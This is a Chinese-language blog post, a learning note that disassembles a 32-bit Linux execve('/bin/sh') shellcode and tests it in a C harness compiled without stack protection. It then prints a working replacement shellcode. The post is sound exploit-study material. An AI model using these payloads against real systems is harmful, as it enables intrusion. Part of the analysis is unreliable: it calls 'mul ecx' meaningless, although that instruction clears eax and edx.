title: ROP 学习之 Shellcode
date: 2018-01-23 21:42:52
updated: 2018-01-27 17:32:12
tags: ["Linux", "Exploit"]
---

# 0

上一篇学习 ROP 的文章中提到原文的 Shellcode 调用失败了，这次就尝试分析下该 Shellcode 看看能不能找出原因。

# 1. 对 Shellcode 反汇编

拿到一段 Shellcode，第一步就是尝试反汇编，参考文章《使用 Python 将 Shellcode 转换成汇编》文章教程，基于 capstone 使用如下代码即可。

```
#!/usr/bin/env python2
# -*- coding:utf-8 -*-

from capstone import *

for code in shellcode:
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    for i in md.disasm(code, 0x00):
        print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
```

从这段源码可以看到，这是利用 capstone 的反汇编功能来实现的，但是需要指定对应汇编的处理器架构和字长信息。

# 2. 分析 Shellcode 原理

Linu 下 Shellcode 的原理参考[《Linux下shellcode的编写》](https://xz.aliyun.com/t/2052)一文，关键是调用系统调用函数 execve。这个函数的参数如下：

* 参数 1：file 文件名
* 参数 2：NULL 即 0
* 参数 3：NULL 即 0

实现调用时，需要将系统调用号码 11 放入 eax 中，最终调用`int 0x80`实现函数调用。

## ROP 教程中的 Shellcode 分析

下面针对第一次调用失败的 Shellcode 反汇编得到的代码分析下：

```
0x0:   xor ecx, ecx     \x31\xc9  // 清空 ecx，即 ecx = 0
0x2:   mul ecx          \xf7\xe1  // 貌似是无意义的 ecx清零指令
0x4:   push ecx         \x51      // 压入参数 0
0x5:   push 0x68732f2f  \x68\x2f\x2f\x73\x68  // 压入字符串
0xa:   push 0x6e69622f  \x68\x2f\x62\x69\x6e  // 压入字符串
0xf:   mov ebx, esp     \x89\xe3  // 将字符串的地址传给 ebx
0x11:  mov al, 0xb      \xb0\x0b  // 调用号 0xb == 11
0x13:  int 0x80         \xcd\x80  // 0x80中 断调用系统调用
```

由此可见，从反汇编角度这段 Shellcode 应该是有问题的，参数没有正常的传入。

## 测试 Shellcode 

同样我们可以将这段 Shellcode 拷贝到测试程序中进行测试。

```
char shellcode[] = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

int main()
{
    int (*ret)() = (int(*)()) shellcode;
    ret();
}
```

然后使用 `gcc -fno-stack-protector -z execstack shellcode.c -o shellcode` 进行编译，预期之内，直接报出 `Segmentation fault` 错误。说明这段 Shellcode 的确是有问题的。

更换为

```
 char shellcode[] =  "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
```

测试正常，该段 Shellcode 可以参考文2来查看详细含义。

# 参考链接

[1.【Python】使用Python将Shellcode转换成汇编](https://bbs.pediy.com/thread-222965.htm)

[2. Linux下shellcode的编写](https://xz.aliyun.com/t/2052)